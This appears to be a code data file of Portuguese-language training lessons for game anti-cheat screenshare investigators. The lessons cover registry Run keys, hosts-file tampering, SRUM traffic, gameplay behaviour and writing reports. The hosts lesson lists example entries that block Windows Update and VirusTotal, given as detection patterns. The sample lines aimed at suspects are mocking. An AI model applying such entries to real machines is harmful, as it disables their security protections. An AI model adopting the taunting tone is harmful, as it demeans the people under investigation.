        body: "AV legítimo não cria Run key apontando Temp com nome SecurityUpdate.\n\nDefender, Kaspersky, etc. usam serviços e paths conhecidos — assinados.\n\nDesculpa genérica = call mais curta.",
        example: "Antivírus registrou loader em Run? Qual AV? McAfee de favela? Mostra ou cala.",
      },
      {
        kind: "veredito",
        heading: "Documentando Registry Persistência",
        body: "Print regedit com chave + valor + Data path visível.\n\nVerifica existência do .exe. DIE/SHA. Cruza Prefetch execução no boot.\n\nRun key + loader ativo = persistência documentada.",
      },
    ],
    [
      "Win+R regedit → HKCU\\...\\Run",
      "Listar Run, RunOnce, HKLM Run se possível",
      "Identificar Data apontando Temp/AppData",
      "Verificar .exe existe — DIE + SHA",
      "Cruzar com Startup e Task Scheduler",
      "Print regedit datado",
    ]),

  L(47, "hosts-dns-local", "Hosts & DNS Local", "deteccoes",
    "Xiter edita hosts pra bloquear update do AV ou redirecionar auth. Arquivo de texto simples — mas data de modificação e entradas suspeitas entregam tampering.",
    [
      {
        kind: "intro",
        heading: "O que é hosts?",
        body: "Arquivo estático DNS local:\n\nC:\\Windows\\System32\\drivers\\etc\\hosts\n\nMapeia domínio → IP manualmente.\n\nAbuso:\n• 127.0.0.1 update.microsoft.com — bloqueia update\n• 0.0.0.0 virustotal.com — bloqueia scan\n• Redirecionar auth server cheat\n\nSem assinatura digital — texto puro editável.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Ler hosts na SS",
        body: "Win + R → notepad C:\\Windows\\System32\\drivers\\etc\\hosts\n\n(Precisa admin — manda rodar Notepad como admin ou copiar conteúdo via type no CMD admin)\n\nLinhas válidas Microsoft: comentários # + poucas entradas default.\n\nEntradas extras redirecionando Microsoft/AV/security = red flag.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Entradas Suspeitas",
        body: "Exemplos clássicos:\n\n127.0.0.1 update.microsoft.com\n127.0.0.1 windowsupdate.com\n0.0.0.0 www.virustotal.com\n\nBloqueio de update/scan = preparação pra rodar cheat sem detecção.\n\nCheca Data de Modificação do arquivo — perto da instalação cheat?",
        example: "hosts bloqueando windowsupdate.com modificado hoje? Não foi Windows. Foi tu evitando patch. Confessa.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Data Modificação + Journal",
        body: "Propriedades do hosts → Data modificação.\n\nJournal USN: WRITE em hosts no horário suspeito.\n\nCruza com Prefetch notepad/cmd/powershell editando + execução loader same day.",
        example: "hosts editado 14:20, loader 14:25? Preparou terreno antes do inject. Timeline fecha.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Veio Assim do Fabricante'",
        body: "hosts default Windows tem ~20 linhas comentadas e localhost.\n\n50 linhas bloqueando domínios Microsoft/segurança não vem de fábrica.\n\nNem Dell, nem Positivo, nem 'técnico da loja' faz isso.",
        example: "Fabricante bloqueou VirusTotal no hosts? Dell hacker edition? Para de mentir.",
      },
      {
        kind: "veredito",
        heading: "Documentando hosts",
        body: "Print conteúdo hosts + data modificação.\n\nLista entradas suspeitas linha por linha.\n\nTampering DNS local = indicador de consciência culpável — combina com exclusão Defender, etc.",
      },
    ],
    [
      "Abrir hosts (admin) — ler todas entradas",
      "Identificar bloqueios Microsoft/AV/scan",
      "Checar Data de Modificação do arquivo",
      "Journal WRITE em hosts no período",
      "Print conteúdo + propriedades",
      "Cruzar com tampering Defender/outros",
    ]),

  L(48, "srum-network", "SRUM — Uso de Rede Detalhado", "windows",
    "Uso de Dados do Windows é amador. SRUM guarda tráfego por app com timestamp de intervalo — auth online e phone-home do loader aparecem no microscópio.",
    [
      {
        kind: "intro",
        heading: "O que é SRUM?",
        body: "System Resource Usage Monitor — banco de dados no registry com histórico de:\n• Bytes enviados/recebidos por app\n• Intervalos de tempo (início/fim)\n• User SID\n• Energy usage\n\nMais granular que Configurações → Uso de dados. Forense de rede quando loader já sumiu.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Parse SRUM",
        body: "SRUM vive em registry (ESE database):\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SRUM\\Extensions\n\nUsa SrumECmd (Zimmerman) ou área 171 ScreenS.\n\nExport CSV → filtra período denúncia → ordena por bytes ou app desconhecido.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ App Desconhecido com Tráfego",
        body: "Padrão:\n\nApp: C:\\Temp\\runtime.exe (ou path desconhecido)\nBytes: 38 MB sent / 12 MB recv\nInterval: 14:20 - 14:45\n\nLoader/auth checa key online — tráfego constante em .exe não-browser.\n\nCruza com Prefetch mesmo .exe no intervalo.",
        example: "SRUM: unknown.exe 38MB entre 14:20-14:45? Auth online gritando. 'Não usa internet' — SRUM ri.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Cruzamento Timeline",
        body: "Monta:\n• SRUM tráfego loader 14:20-14:45\n• Prefetch LOADER 14:22\n• Uso de Dados Windows confirma app\n• Scan/painel mostra auth URL se capturou\n\nRede + execução + emulador = auth cheat documentado.",
        example: "Loader com 38MB SRUM + Prefetch + partida 14:30? Phone-home de cheat, não 'Spotify background'.",
      },
      {
        kind: "zuera",
        heading: "🤣 'É Tráfego do Windows'",
        body: "svchost tráfego → path System32.\n\nLoader em Temp com MB enviados → não é serviço Windows.\n\nSRUM mostra path completo do executável — não aceita 'processo do sistema' genérico.",
        example: "38MB de runtime.exe em Temp é Windows Update? Update mora em System32, não Temp. Next.",
      },
      {
        kind: "veredito",
        heading: "Documentando SRUM",
        body: "Export SRUM filtrado. Destaca app path, bytes, intervalo.\n\nCruza Prefetch/Uso de Dados. Evidência numerada.\n\nSRUM sozinho raramente ban — com execução + inject = case.",
      },
    ],
    [
      "Export SRUM (SrumECmd ou 171 ScreenS)",
      "Filtrar intervalo da denúncia/partida",
      "Listar apps desconhecidos com tráfego alto",
      "Anotar path + bytes + timestamps",
      "Cruzar com Prefetch e Uso de Dados",
      "Print export + linha destacada",
    ]),

  L(49, "emulador-input-lag", "Input Lag & Comportamento", "deteccoes",
    "Gameplay suspeito sem arquivo não é ban automático — mas aim robótico + evidência técnica vira combo. Telador esperto usa comportamento como reforço, não como única prova.",
    [
      {
        kind: "intro",
        heading: "Comportamento vs Evidência Técnica",
        body: "Regra de ouro: NUNCA bane só por 'jogou estranho'.\n\nInput lag inconsistente, flick robótico, tracking through smoke — são SINAIS.\n\nPrecisa de artefato: Prefetch loader, Event 10, DLL inject, auth SRUM.\n\nComportamento abre investigação. Técnico fecha veredito.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — O que Observar",
        body: "Sinais comportamentais (emulador/mobile):\n• Tracking perfeito em flick rápido\n• Pré-aim em parede (wallhack behavior)\n• Recoil zero impossível manual\n• Reação < humano em cada peek\n• Inconsistência: bronze gameplay + aim radiante\n\nAnota timestamp partida — cruza com artefatos no mesmo horário.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Combo Comportamento + Técnico",
        body: "Cenário ideal relatório:\n\n1. Clip denúncia — comportamento suspeito 14:30 partida\n2. Prefetch loader 14:28\n3. Event 10 loader → dnplayer 14:29\n4. DLL Temp no System Informer\n\nGameplay = contexto. Técnico = prova. Staff ama combo numerado.",
        example: "Clip mostra tracking robótico 14:30 + Event 10 e loader Prefetch 14:28? Não é 'só aim bom'. É case com contexto.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Input Lag Real vs Fake",
        body: "Emulador legítimo tem input lag — movimento nem sempre instantâneo.\n\nCheat compensa lag ou ignora — movimento 'cola' no alvo.\n\nDiferença sutil — por isso NÃO ban só por vídeo.\n\nMas vídeo + inject.dll = narrativa completa pro staff.",
        example: "Lag zero com flick 180° headshot through smoke? Nem pro player PC faz isso consistente. Abre SS, não fecha ban.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Sou Só Bom Mesmo'",
        body: "Radiante no PC ≠ tracking robótico no emu com loader no Prefetch.\n\nSkill argument contra Event 10 é comédia.\n\nPede SS técnica — skill se defende lá com artefato na mesa.",
        example: "'Sou pro' mas Prefetch loader 14:28? Pro de quê — de inject? Senta na SS com System Informer aberto.",
      },
      {
        kind: "veredito",
        heading: "Regra do Servidor",
        body: "Documenta:\n• Clip/timestamp comportamento (referência, não prova única)\n• Evidências técnicas numeradas\n• Veredito baseado em TÉCNICO\n\nComportamento sozinho = monitorar/investigar. Comportamento + técnico = ban justificado.",
      },
    ],
    [
      "Anotar timestamp exato partida denunciada",
      "Revisar clip — descrever sinais (sem ban só por isso)",
      "Cruzar horário partida com Prefetch/Event/DLL",
      "Montar combo comportamento + artefato",
      "Seguir regra do servidor (staff guidelines)",
      "Relatório: técnico primeiro, gameplay apoio",
    ]),

  L(50, "relatorio-tier1", "Montar Relatório — Tier I", "analise",
    "Telador que acha cheat mas escreve relatório de bosta perde no staff. Template certo, evidência numerada, SHA anexado — veredito na mesa sem drama.",
    [
      {
        kind: "intro",
        heading: "Por que Relatório Importa?",
        body: "Staff não tava na call. Relatório É a call escrita.\n\nRuim: 'achei suspeito, ban'\n\nBom: PIN, data, evidências numeradas, SHA, veredito claro.\n\nRelatório fraco = caso devolvido = xiter escapa = tu passa vergonha.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Template Tier I",
        body: "Estrutura obrigatória:\n\n• PIN / ID denúncia\n• Data e hora da SS\n• Resumo (2-3 linhas — o que foi analisado)\n• Evidências numeradas (EVID #1, #2...)\n• Veredito (BAN / SUSPEITO / CLEAN / MONITORAR)\n• Anexos (SHA256 de arquivos citados)\n\nCada EVID = 1 artefato + print + timestamp.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Exemplo de Evidências",
        body: "EVID #1: Prefetch LOADER.EXE-ABC123.pf — execução 14:31 — C:\\Temp\\loader.exe\nEVID #2: Defender exclusão C:\\cheats documentada\nEVID #3: Event 10 — loader.exe → HD-Player.exe — 14:32\nEVID #4: SHA256 abc123... — unknown.dll C:\\Temp\\\n\nVeredito: BAN — persistência + inject + tampering Defender.",
        example: "Relatório com 4 EVID numerados + SHA? Staff aprova em 2 min. 'Achei suspeito' — staff ri e devolve.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Linguagem e Tom",
        body: "Relatório = NEUTRO e TÉCNICO.\n\nDebochado na call, sério no paper.\n\nEscreve:\n• 'Executável não assinado em Temp com Prefetch 14:31'\n• NÃO: 'xiter burro deixou loader'\n\nStaff precisa fatos, paths, horários, hashes — não stand-up comedy.",
        example: "Call: 'Mano, tu é comédia'. Relatório: 'EVID #1: Prefetch loader.exe 14:31 Temp'. Separa os mundos.",
      },
      {
        kind: "zuera",
        heading: "🤣 Relatório Copy-Paste Genérico",
        body: "Staff reconhece de longe:\n• 'Encontrei arquivos suspeitos'\n• Zero timestamp\n• Zero SHA\n• Veredito BAN sem EVID\n\nIsso vai pro lixo. Tempo teu e do staff wasted.",
        example: "Relatório 'ban porque sim' sem EVID? Staff devolve mais rápido que xiter fecha loader. Faz direito.",
      },
      {
        kind: "veredito",
        heading: "Checklist Final Antes de Enviar",
        body: "Antes de submit:\n☑ PIN correto\n☑ Toda evidência tem #, path, horário\n☑ SHA dos arquivos citados\n☑ Prints legíveis e datados\n☑ Veredito bate com evidências (não exagera)\n☑ Tier I — não inventa Sysmon Event 25 se não viu\n\nGraduado Tier I = telador que staff confia.",
      },
    ],
    [
      "Usar template: PIN | Data | Resumo | EVID# | Veredito | SHA",
      "Numerar cada evidência com path + timestamp",
      "Anexar SHA256 de todo .exe/.dll citado",
      "Linguagem neutra/técnica no relatório",
      "Veredito alinhado com evidências (sem inflar)",
      "Revisar antes de enviar pro staff",
    ]),
];
